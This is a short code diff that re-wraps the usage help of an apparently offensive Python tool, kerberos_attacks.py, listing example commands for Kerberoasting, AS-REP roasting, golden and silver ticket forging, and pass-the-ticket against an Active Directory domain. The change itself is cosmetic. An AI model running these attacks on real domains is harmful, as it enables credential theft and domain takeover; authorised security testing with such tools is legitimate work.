@@ -764,16 +764,20 @@ if __name__ == "__main__":
         logger.info("")
         logger.info("Examples:")
         logger.info(
-            "  Kerberoast: python kerberos_attacks.py domain.com 10.0.0.1 kerberoast -u user -p pass -spn MSSQLSvc/db:1433"
+            "  Kerberoast: python kerberos_attacks.py domain.com 10.0.0.1 kerberoast"
+            " -u user -p pass -spn MSSQLSvc/db:1433"
         )
         logger.info(
-            "  AS-REP:     python kerberos_attacks.py domain.com 10.0.0.1 asrep -users user1,user2,user3"
+            "  AS-REP:     python kerberos_attacks.py domain.com 10.0.0.1 asrep"
+            " -users user1,user2,user3"
         )
         logger.info(
-            "  Golden:     python kerberos_attacks.py domain.com 10.0.0.1 golden -krbtgt <hash> -sid S-1-5-21-xxx"
+            "  Golden:     python kerberos_attacks.py domain.com 10.0.0.1 golden"
+            " -krbtgt <hash> -sid S-1-5-21-xxx"
         )
         logger.info(
-            "  Silver:     python kerberos_attacks.py domain.com 10.0.0.1 silver -hash <hash> -sid S-1-5-21-xxx -spn cifs/server"
+            "  Silver:     python kerberos_attacks.py domain.com 10.0.0.1 silver"
+            " -hash <hash> -sid S-1-5-21-xxx -spn cifs/server"
         )
         logger.info(
             "  PTT:        python kerberos_attacks.py domain.com 10.0.0.1 ptt -ccache ticket.ccache"
